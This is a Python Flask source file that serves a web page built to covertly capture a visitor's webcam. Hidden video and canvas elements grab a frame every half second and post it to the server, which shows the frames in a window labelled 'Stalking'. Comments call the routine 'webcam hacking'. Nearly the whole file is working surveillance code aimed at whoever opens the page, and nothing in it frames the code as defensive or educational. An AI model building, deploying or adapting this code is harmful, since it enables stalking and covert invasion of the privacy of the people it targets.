# packages
import base64
import cv2
import numpy as np
import threading
import socket
from flask import Flask, request, render_template_string

# create a web application instance
app = Flask(__name__)

# get the local IP address
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
local_ip = s.getsockname()[0]
s.close()

# update remote webcam view frame
def update(frame):
    # open frame in a window
    cv2.imshow('Stalking', frame)
    cv2.waitKey()

# catch video stream on the server side
@app.route('/stream', methods=['POST'])
def stalk():
    # extract base64 encoded string from the client (web browser)
    img_str = request.form.get('frame').split('data:image/png;base64,')[-1]
    
    # convert base64 encoded string to a byte string
    img_byt = base64.b64decode(img_str)
    
    # convert a byte string to a numpy array
    image = np.fromstring(img_byt, np.uint8)
    
    # convert a numpy array to an opencv compatible image
    frame = cv2.imdecode(image, cv2.IMREAD_COLOR)
    
    # display the frame in a window
    display_thread = threading.Thread(target=update, args=(frame,))
    display_thread.start()
    
    # return from the API call
    return ''

# root route
@app.route('/')
def index():
    return render_template_string('''
        <!-- Fake website content -->
        <h1 align="center">While you're reading this someone is spying on you via your webcam!<h1>
        
        <!-- Video frame -->
        <video hidden id="video" playsinline autoplay></video>
        
        <!-- Canvas to sniff data from -->
        <canvas hidden id="canvas" width="640" height="640">canvas</canvas>
        
        <!-- Jquery to make HTTP POST requests to send images from a webcam -->
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
        
        <!-- Webcam hacking happens here -->
        <script>
            // send a single frame from the webcam to your HTTP server 
            function post(imgdata){
                $.ajax({
                    type: 'POST',
                    data: {frame: imgdata},
                    url: '/stream',
                    dataType: 'json',
                    async: false
                });
            };

            // hook up video frame and canvas elements
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            // target device's webcam settings
            const constraints = {
                audio: false,
                video: { facingMode: "user" }
            };
            
            // activate a webcam on a target device
            async function hackWebcam() {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                window.stream = stream;
                video.srcObject = stream;

                var context = canvas.getContext('2d');
                
                setInterval(function() {
                    context.drawImage(video, 0, 0, 640, 640);
                    var canvasData = canvas.toDataURL("image/png")
                    post(canvasData);
                }, 500);
            }

            // hacking starts here
            hackWebcam();
        </script>
    ''')

# main loop
if __name__ == '__main__':
    # start a web server
    app.run(debug=True, threaded=True, host='0.0.0.0', port=8000)
    print(f"Server is running at http://{local_ip}:8000")